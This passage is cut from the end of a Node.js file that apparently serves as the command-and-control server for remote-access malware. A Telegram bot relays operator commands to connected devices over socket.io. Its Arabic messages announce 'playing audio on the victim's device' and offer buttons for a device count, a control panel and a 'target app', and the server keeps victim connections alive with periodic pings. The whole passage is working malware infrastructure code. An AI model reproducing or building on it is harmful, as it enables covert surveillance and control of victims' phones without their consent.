      bot.sendMessage(msg.chat.id, "<b>🔊 جاري تشغيل الصوت على جهاز الضحية...</b>", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
            ["👨‍💻 معلومات المطور", "★ تطبيق الهدف ★"]
          ],
          resize_keyboard: true
        }
      }).catch(console.error);
    }).catch(console.error);
  }
});

setInterval(() => {
  io.sockets.sockets.forEach(socket => {
    socket.emit("ping", {});
  });
}, 5000);

server.listen(process.env.PORT || 3000, () => {
  console.log("🟢 الخادم يعمل على المنفذ 3000");
});
